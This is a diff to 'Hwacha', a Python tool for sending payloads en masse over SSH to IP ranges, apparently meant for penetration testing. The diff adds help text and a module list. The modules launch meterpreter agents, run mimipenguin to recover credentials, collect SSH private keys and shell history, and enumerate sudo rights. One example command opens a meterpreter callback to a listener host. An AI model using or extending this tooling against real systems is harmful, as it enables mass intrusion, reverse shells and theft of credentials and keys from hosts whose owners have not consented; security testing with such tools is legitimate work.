@@ -1,4 +1,5 @@
 import os
+import sys
 import time
 import base64
 import thread
@@ -347,30 +348,61 @@ def make_port(port):
     hex_port += '\\x' + port[2:4].zfill(2)
     return hex_port
 
+def examples():
+    print 'To run commands, use -x [COMMAND]'
+    print 'to run modules, use -m [MODULE]'
+    print 'to specify module options, use -o [ARG=ARG ARG=ARG]'
+    print CRED + 'Example usage:' + CEND
+    print CYELLOW + 'python hwacha.py -t 192.168.1.1/24 -u admin  -p password -x id' + CEND
+    print CYELLOW + 'python hwacha.py -t 192.168.1.100-200 -u admin  -p password -m keys' + CEND
+    print CYELLOW + 'python hwacha.py -t 192.168.1.123 -u admin  -p password -m meterpreter -o \"LPORT=4444 LHOST=192.168.1.150 TYPE=64\"' + CEND
+
+def print_modules():
+    print ""
+    print CRED + "Available Modules:" + CEND
+    print CYELLOW + "[*] meterpreter" + CEND + "               Use this to execute a meterpreter agent on the target(s)."
+    print    "                              REQURED ARGUMENTS: LHOST , LPORT"
+    print "                              OPTIONAL ARGUMENTS: TYPE {python, php, 64, osx}"
+    print CYELLOW + "[*] mimipenguin" + CEND + "               Use this to execute a mimipenguin on the target(s) to recover credentials.  (Requires root)"
+    print "                              OPTIONAL ARGUMENTS: LHOST, LPORT"
+    print CYELLOW + "[*] keys" + CEND + "                      Use this to collect SSH private keys from the target(s)."
+    print CYELLOW + "[*] history" + CEND + "                   Use this to collect shell history files from the target(s)."
+    print CYELLOW +  "[*] privs" + CEND + "                     Use this to enumerate sudo privileges on the targets(s)."
+
+
 def banner():
     art = CGREEN +  """    &&&&     &&         &&        &&
-&&&&&&&&&&&& &&         &&        &&
-   &&&&&&    &&     &&&&&&&&&&    &&
-  &&    &&   &&&&&      &&        &&&&&
- &&      &&  &&&&&    &&  &&      &&&&&
-  &&    &&   &&      &&    &&     &&
-   &&&&&&    &&    &&&      &&&   &&
-     &&      &&   &&          &&  &&
-&&&&&&&&&&&&&&&                   &&
-             &&                   &&""" + CEND
+&&&&&&&&&&&& &&         &&        &&      Created by Esteban Rodriguez   /~~\_
+   &&&&&&    &&     &&&&&&&&&&    &&	  Web: https://www.n00py.io     /| '` *\\
+  &&    &&   &&&&&      &&        &&&&&        Twitter: @n00py1         \|  ___/
+ &&      &&  &&&&&    &&  &&      &&&&&   _   _                     _
+  &&    &&   &&      &&    &&     &&     | | | |                   | |
+   &&&&&&    &&    &&&      &&&   &&     | |_| |__      ____ _  ___| |__   __ _
+     &&      &&   &&          &&  &&     |  _  |\ \ /\ / / _` |/ __| '_ \ / _` |
+&&&&&&&&&&&&&&&                   &&     | | | | \ V  V / (_| | (__| | | | (_| |
+             &&                   &&     \_| |_/  \_/\_/ \__,_|\___|_| |_|\__,_| """ + CEND
     return art
 
 def main():
-    parser = argparse.ArgumentParser(description='ClubPenguin')
-    parser.add_argument('-t', '--target', help='IP Address, IP range, or subnet', required=True)
-    parser.add_argument('-u','--username', help='SSH username',required=True)
+    parser = argparse.ArgumentParser(description='Hwacha, a tool for sending payloads en masse via SSH')
+    parser.add_argument('-t', '--target', help='IP Address, IP range, or subnet', required=False, default=False)
+    parser.add_argument('-u','--username', help='SSH username',required=False, default=False)
     parser.add_argument('-p','--password',help='SSH password', required=False, default=False)
     parser.add_argument('-i', '--identity_file', help='SSH key path', required=False, default=False)
     parser.add_argument('-x','--command',help='Command to execute', required=False)
     parser.add_argument('-m', '--module', help='Module to run', required=False)
     parser.add_argument('-o', '--options', help='Options for module', required=False)
+    parser.add_argument('-L', '--list', help='List available modules and options', required=False, action='store_true')
     args = parser.parse_args()
-    print banner()
+    if args.list:
+        print banner()
+        print_modules()
+        sys.exit()
+
+    if not args.target or not args.username or not args.password:
+        print banner()
+        examples()
+        sys.exit()
     targets = parse_targets(args.target)
     if not args.command and not args.module:
         start_thread(targets, "login", [22, args.username, args.password, args.identity_file, 1])
